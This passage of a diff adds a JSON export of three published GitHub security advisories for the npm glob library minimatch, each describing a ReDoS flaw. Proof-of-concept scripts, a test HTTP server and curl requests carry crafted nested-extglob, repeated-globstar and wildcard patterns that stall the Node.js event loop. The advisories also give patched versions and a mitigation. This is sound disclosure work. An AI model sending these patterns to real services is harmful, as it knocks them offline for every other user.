19 a's + z) and return immediately:\r\n```\r\ncurl \"http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz\" &\r\n```\r\n\r\nTerminal 3 -- send a benign request while the attack is in-flight:\r\n```\r\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz\"\r\n```\r\n\r\n**Observed output -- Terminal 2 (attack):**\r\n```\r\n{\"result\":false,\"ms\":\"64149\"}\r\n```\r\n\r\n**Observed output -- Terminal 3 (benign, concurrent):**\r\n```\r\n{\"result\":false,\"ms\":\"0\"}\r\n\r\ntime_total: 63.022047s\r\n```\r\n\r\n**Terminal 1 (server log):**\r\n```\r\n[2026-02-20T09:41:17.624Z] pattern=\"*(*(*(a|b)))\" path=\"aaaaaaaaaaaaaaaaaaaz\"\r\n[2026-02-20T09:42:21.775Z] done in 64149ms result=false\r\n[2026-02-20T09:42:21.779Z] pattern=\"*(a|b)\" path=\"aaaz\"\r\n[2026-02-20T09:42:21.779Z] done in 0ms result=false\r\n```\r\n\r\nThe server reports `\"ms\":\"0\"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.\r\n\r\nNote: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.\r\n\r\n---\r\n\r\n### Impact\r\n\r\nAny context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.\r\n\r\nDepth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.\r\n\r\n`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).\r\n\r\n**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "isaacs",
+        "id": 9287,
+        "node_id": "MDQ6VXNlcjkyODc=",
+        "avatar_url": "https://avatars.githubusercontent.com/u/9287?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/isaacs",
+        "html_url": "https://github.com/isaacs",
+        "followers_url": "https://api.github.com/users/isaacs/followers",
+        "following_url": "https://api.github.com/users/isaacs/following{/other_user}",
+        "gists_url": "https://api.github.com/users/isaacs/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/isaacs/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/isaacs/subscriptions",
+        "organizations_url": "https://api.github.com/users/isaacs/orgs",
+        "repos_url": "https://api.github.com/users/isaacs/repos",
+        "events_url": "https://api.github.com/users/isaacs/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/isaacs/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-23c5-xmqv-rm74",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-27904",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-02-25T03:24:42Z",
+      "published_at": "2026-02-25T00:18:57Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=10.0.0, < 10.2.3",
+          "patched_versions": "10.2.3",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=9.0.0, <9.0.7",
+          "patched_versions": "9.0.7",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=8.0.0, <8.0.6",
+          "patched_versions": "8.0.6",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=7.0.0, <7.4.8",
+          "patched_versions": "7.4.8",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=6.0.0, <6.2.2",
+          "patched_versions": "6.2.2",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=5.0.0, <5.1.8",
+          "patched_versions": "5.1.8",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=4.0.0, <4.2.5",
+          "patched_versions": "4.2.5",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=0.0.0, <=3.1.3",
+          "patched_versions": "3.1.4",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-1333"
+      ],
+      "credits": [
+        {
+          "login": "dolevmiz1",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "dolevmiz1",
+            "id": 145009741,
+            "node_id": "U_kgDOCKSsTQ",
+            "avatar_url": "https://avatars.githubusercontent.com/u/145009741?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/dolevmiz1",
+            "html_url": "https://github.com/dolevmiz1",
+            "followers_url": "https://api.github.com/users/dolevmiz1/followers",
+            "following_url": "https://api.github.com/users/dolevmiz1/following{/other_user}",
+            "gists_url": "https://api.github.com/users/dolevmiz1/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/dolevmiz1/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/dolevmiz1/subscriptions",
+            "organizations_url": "https://api.github.com/users/dolevmiz1/orgs",
+            "repos_url": "https://api.github.com/users/dolevmiz1/repos",
+            "events_url": "https://api.github.com/users/dolevmiz1/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/dolevmiz1/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 2,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      }
+    },
+    {
+      "ghsa_id": "GHSA-7r86-cg39-jmmj",
+      "cve_id": "CVE-2026-27903",
+      "url": "https://api.github.com/repos/isaacs/minimatch/security-advisories/GHSA-7r86-cg39-jmmj",
+      "html_url": "https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj",
+      "summary": "ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments",
+      "description": "### Summary\r\n\r\n`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.\r\n\r\n---\r\n\r\n### Details\r\n\r\nThe vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):\r\n\r\n```typescript\r\nwhile (fr < fl) {\r\n  ..\r\n  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {\r\n    ..\r\n    return true\r\n  }\r\n  ..\r\n  fr++\r\n}\r\n```\r\n\r\nWhen a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).\r\n\r\nThere is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.\r\n\r\nMeasured timing with n=30 path segments:\r\n\r\n| k (globstars) | Pattern size | Time     |\r\n|---------------|--------------|----------|\r\n| 7             | 36 bytes     | ~154ms   |\r\n| 9             | 46 bytes     | ~1.2s    |\r\n| 11            | 56 bytes     | ~5.4s    |\r\n| 12            | 61 bytes     | ~9.7s    |\r\n| 13            | 66 bytes     | ~15.9s   |\r\n\r\n---\r\n\r\n### PoC\r\n\r\nTested on minimatch@10.2.2, Node.js 20.\r\n\r\n**Step 1 -- inline script**\r\n\r\n```javascript\r\nimport { minimatch } from 'minimatch'\r\n\r\n// k=9 globstars, n=30 path segments\r\n// pattern: 46 bytes, default options\r\nconst pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'\r\nconst path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'\r\n\r\nconst start = Date.now()\r\nminimatch(path, pattern)\r\nconsole.log(Date.now() - start + 'ms') // ~1200ms\r\n```\r\n\r\nTo scale the effect, increase k:\r\n\r\n```javascript\r\n// k=11 -> ~5.4s, k=13 -> ~15.9s\r\nconst k = 11\r\nconst pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'\r\nconst path    = Array(30).fill('a').join('/')\r\nminimatch(path, pattern)\r\n```\r\n\r\nNo special options are required. This reproduces with the default `minimatch()` call.\r\n\r\n**Step 2 -- HTTP server (event loop starvation proof)**\r\n\r\nThe following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:\r\n\r\n```javascript\r\n// poc1-server.mjs\r\nimport http from 'node:http'\r\nimport { URL } from 'node:url'\r\nimport { minimatch } from 'minimatch'\r\n\r\nconst PORT = 3000\r\n\r\nconst server = http.createServer((req, res) => {\r\n  const url = new URL(req.url, `http://localhost:${PORT}`)\r\n  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }\r\n\r\n  const pattern = url.searchParams.get('pattern') ?? ''\r\n  const path    = url.searchParams.get('path') ?? ''\r\n\r\n  const start  = process.hrtime.bigint()\r\n  const result = minimatch(path, pattern)\r\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\r\n\r\n  res.writeHead(200, { 'Content-Type': 'application/json' })\r\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\r\n})\r\n\r\nserver.listen(PORT)\r\n```\r\n\r\nTerminal 1 -- start the server:\r\n```\r\nnode poc1-server.mjs\r\n```\r\n\r\nTerminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:\r\n```\r\ncurl \"http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa\" &\r\n```\r\n\r\nTerminal 3 -- while the attack is in-flight, send a benign request:\r\n```\r\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz\"\r\n```\r\n\r\n**Observed output (Terminal 3):**\r\n```\r\n{\"result\":true,\"ms\":\"0\"}\r\n\r\ntime_total: 4.132709s\r\n```\r\n\r\nThe server reports `\"ms\":\"0\"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:\r\n\r\n```\r\n{\"result\":true,\"ms\":\"0\"}\r\n\r\ntime_total: 0.001599s\r\n```\r\n\r\n---\r\n\r\n### Impact\r\n\r\nAny application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "isaacs",
+        "id": 9287,
+        "node_id": "MDQ6VXNlcjkyODc=",
+        "avatar_url": "https://avatars.githubusercontent.com/u/9287?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/isaacs",
+        "html_url": "https://github.com/isaacs",
+        "followers_url": "https://api.github.com/users/isaacs/followers",
+        "following_url": "https://api.github.com/users/isaacs/following{/other_user}",
+        "gists_url": "https://api.github.com/users/isaacs/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/isaacs/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/isaacs/subscriptions",
+        "organizations_url": "https://api.github.com/users/isaacs/orgs",
+        "repos_url": "https://api.github.com/users/isaacs/repos",
+        "events_url": "https://api.github.com/users/isaacs/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/isaacs/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-7r86-cg39-jmmj",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-27903",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-02-25T03:24:37Z",
+      "published_at": "2026-02-25T00:19:00Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=10.0.0, < 10.2.3",
+          "patched_versions": "10.2.3",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=9.0.0, <9.0.7",
+          "patched_versions": "9.0.7",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=8.0.0, <8.0.6",
+          "patched_versions": "8.0.6",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=7.0.0, <7.4.8",
+          "patched_versions": "7.4.8",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=6.0.0, <6.2.2",
+          "patched_versions": "6.2.2",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=5.0.0, <5.1.8",
+          "patched_versions": "5.1.8",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=4.0.0, <4.2.5",
+          "patched_versions": "4.2.5",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">=0.0.0, <3.1.3",
+          "patched_versions": "3.1.3",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-407",
+          "name": "Inefficient Algorithmic Complexity"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-407"
+      ],
+      "credits": [
+        {
+          "login": "dolevmiz1",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "dolevmiz1",
+            "id": 145009741,
+            "node_id": "U_kgDOCKSsTQ",
+            "avatar_url": "https://avatars.githubusercontent.com/u/145009741?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/dolevmiz1",
+            "html_url": "https://github.com/dolevmiz1",
+            "followers_url": "https://api.github.com/users/dolevmiz1/followers",
+            "following_url": "https://api.github.com/users/dolevmiz1/following{/other_user}",
+            "gists_url": "https://api.github.com/users/dolevmiz1/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/dolevmiz1/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/dolevmiz1/subscriptions",
+            "organizations_url": "https://api.github.com/users/dolevmiz1/orgs",
+            "repos_url": "https://api.github.com/users/dolevmiz1/repos",
+            "events_url": "https://api.github.com/users/dolevmiz1/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/dolevmiz1/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 1,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      }
+    },
+    {
+      "ghsa_id": "GHSA-3ppc-4f35-3m26",
+      "cve_id": "CVE-2026-26996",
+      "url": "https://api.github.com/repos/isaacs/minimatch/security-advisories/GHSA-3ppc-4f35-3m26",
+      "html_url": "https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26",
+      "summary": "ReDoS via repeated wildcards with non-matching literal in pattern",
+      "description": "### Summary\r\n`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.\r\n\r\nThe time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.\r\n\r\n\r\n### Details\r\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\r\n\r\n### PoC\r\nWhen minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:\r\n\r\n```\r\n/^(?!\\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/\r\n```\r\n\r\nWhen the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.\r\n### Impact\r\nAny application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:\r\n- File search/filter UIs that accept glob patterns\r\n- `.gitignore`-style filtering with user-defined rules\r\n- Build tools that accept glob configuration\r\n- Any API that exposes glob matching to untrusted input\r\n\r\n----\r\n\r\nThanks to @ljharb for back-porting the fix to legacy versions of minimatch. ",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "isaacs",
+        "id": 9287,
+        "node_id": "MDQ6VXNlcjkyODc=",
+        "avatar_url": "https://avatars.githubusercontent.com/u/9287?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/isaacs",
+        "html_url": "https://github.com/isaacs",
+        "followers_url": "https://api.github.com/users/isaacs/followers",
+        "following_url": "https://api.github.com/users/isaacs/following{/other_user}",
+        "gists_url": "https://api.github.com/users/isaacs/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/isaacs/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/isaacs/subscriptions",
+        "organizations_url": "https://api.github.com/users/isaacs/orgs",
+        "repos_url": "https://api.github.com/users/isaacs/repos",
+        "events_url": "https://api.github.com/users/isaacs/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/isaacs/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-3ppc-4f35-3m26",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-26996",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-02-22T03:57:38Z",
+      "published_at": "2026-02-17T04:32:34Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": "10 <10.2.1 || 3 <3.1.3 || 4 <4.2.4 || 5 <5.1.7 || 6 <6.2.1 || 7 <7.4.7 || 8 <8.0.5 || 9 <9.0.6",
+          "patched_versions": "10.2.1 || 3.1.3 || 4.2.4 || 5.1.7 || 6.2.1 || 7.4.7 || 8.0.5 || 9.0.6",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [],
+      "cwe_ids": [],
+      "credits": [
+        {
+          "login": "AkshayJainG",
+          "type": "reporter"
+        },
+        {
+          "login": "ljharb",
+          "type": "remediation_developer"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "AkshayJainG",
+            "id": 13941512,
+            "node_id": "MDQ6VXNlcjEzOTQxNTEy",
+            "avatar_url": "https://avatars.githubusercontent.com/u/13941512?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/AkshayJainG",
+            "html_url": "https://github.com/AkshayJainG",
+            "followers_url": "https://api.github.com/users/AkshayJainG/followers",
+            "following_url": "https://api.github.com/users/AkshayJainG/following{/other_user}",
+            "gists_url": "https://api.github.com/users/AkshayJainG/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/AkshayJainG/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/AkshayJainG/subscriptions",
+            "organizations_url": "https://api.github.com/users/AkshayJainG/orgs",
+            "repos_url": "https://api.github.com/users/AkshayJainG/repos",
+            "events_url": "https://api.github.com/users/AkshayJainG/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/AkshayJainG/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter",
+          "state": "accepted"
+        },
+        {
+          "user": {
+            "login": "ljharb",
+            "id": 45469,
+            "node_id": "MDQ6VXNlcjQ1NDY5",
+            "avatar_url": "https://avatars.githubusercontent.com/u/45469?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/ljharb",
+            "html_url": "https://github.com/ljharb",
+            "followers_url": "https://api.github.com/users/ljharb/followers",
+            "following_url": "https://api.github.com/users/ljharb/following{/other_user}",
+            "gists_url": "https://api.github.com/users/ljharb/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/ljharb/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/ljharb/subscriptions",
+            "organizations_url": "https://api.github.com/users/ljharb/orgs",
+            "repos_url": "https://api.github.com/users/ljharb/repos",
+            "events_url": "https://api.github.com/users/ljharb/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/ljharb/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "remediation_developer",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 1,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    }
+  ]
+}
